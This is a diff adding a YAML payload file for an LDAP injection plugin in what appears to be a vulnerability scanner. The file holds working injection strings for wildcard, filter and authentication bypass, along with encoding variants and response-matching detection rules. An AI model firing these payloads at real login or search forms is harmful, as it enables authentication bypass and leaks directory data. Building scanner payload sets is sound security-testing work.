@@ -1,0 +1,76 @@
+# LDAP Injection Payloads Database
+# Plugin: core.injection.ldap_injection
+
+plugin_id: core.injection.ldap_injection
+mutation_type: field_injection
+payload_type: ldap
+
+variants:
+  # Variant 1: Wildcard bypass
+  - id: wildcard_bypass
+    payloads:
+      - "*"
+      - "*)(uid=*"
+      - "*)(|(uid=*"
+    tech_stack: []
+    confidence_boost: 0.20
+    detection: body_matches_any(uid=, cn=, ou=)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [unicode_escape]
+      obfuscation: []
+      max_combinations: 6
+
+  # Variant 2: Filter injection
+  - id: filter_injection
+    payloads:
+      - "admin)(&"
+      - "admin)(|(password=*"
+      - ")(cn=*"
+    tech_stack: []
+    confidence_boost: 0.18
+    detection: body_matches_any(uid=, admin, authenticated)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 3: Authentication bypass
+  - id: auth_bypass
+    payloads:
+      - "*))%00"
+      - "admin*)((|userPassword=*"
+      - "*))(|(objectClass=*"
+    tech_stack: []
+    confidence_boost: 0.22
+    detection: status_code == 200 AND body_matches_any(authenticated, logged in)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [null_byte]
+      obfuscation: []
+      max_combinations: 5
+
+keywords:
+  - username
+  - user
+  - login
+  - uid
+  - cn
+  - dn
+  - filter
+  - query
+  - search
+
+expected_results:
+  wildcard_bypass:
+    indicator: info_disclosure
+    expected_output: "uid="
+  filter_injection:
+    indicator: auth_bypass
+    expected_output: "authenticated"
+  auth_bypass:
+    indicator: auth_bypass
+    expected_output: "logged in"
